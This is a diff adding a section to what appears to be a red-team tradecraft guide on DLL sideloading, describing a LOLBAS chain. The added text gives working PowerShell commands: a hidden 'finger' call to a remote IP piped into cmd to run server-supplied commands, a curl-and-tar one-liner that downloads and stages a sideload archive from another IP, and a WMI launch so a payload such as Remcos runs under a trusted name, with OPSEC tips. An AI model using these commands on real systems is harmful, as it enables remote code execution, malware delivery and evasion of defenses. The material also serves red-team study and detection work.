@@ -491,6 +491,34 @@ Tradecraft notes:
 * Because the executable stays trusted, most allowlisting controls only need your malicious DLL to sit alongside it. Focus on customizing the loader DLL; the signed parent can typically run untouched.
 * ShadowPad’s decryptor expects the TMP blob to live next to the loader and be writable so it can zero the file after mapping. Keep the directory writable until the payload loads; once in memory the TMP file can safely be deleted for OPSEC.
 
+### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)
+
+Operators pair DLL sideloading with LOLBAS so the only custom artifact on disk is the malicious DLL next to the trusted EXE:
+
+- **Remote command loader (Finger):** Hidden PowerShell spawns `cmd.exe /c`, pulls commands from a Finger server, and pipes them to `cmd`:
+
+  ```powershell
+  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
+  ```
+  - `finger user@host` pulls TCP/79 text; `| cmd` executes the server response, letting operators rotate second stage server-side.
+
+- **Built-in download/extract:** Download an archive with a benign extension, unpack it, and stage the sideload target plus DLL under a random `%LocalAppData%` folder:
+
+  ```powershell
+  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
+  ```
+  - `curl -s -L` hides progress and follows redirects; `tar -xf` uses Windows' built-in tar.
+
+- **WMI/CIM launch:** Start the EXE via WMI so telemetry shows a CIM-created process while it loads the colocated DLL:
+
+  ```powershell
+  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
+  ```
+  - Works with binaries that prefer local DLLs (e.g., `intelbq.exe`, `nearby_share.exe`); payload (e.g., Remcos) runs under the trusted name.
+
+- **Hunting:** Alert on `forfiles` when `/p`, `/m`, and `/c` appear together; uncommon outside admin scripts.
+
+
 ## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)
 
 A recent Lotus Blossom intrusion abused a trusted update chain to deliver an NSIS-packed dropper that staged a DLL sideload plus fully in-memory payloads.
@@ -521,6 +549,7 @@ C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
 
 ## References
 
+- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
 - [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
 - [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
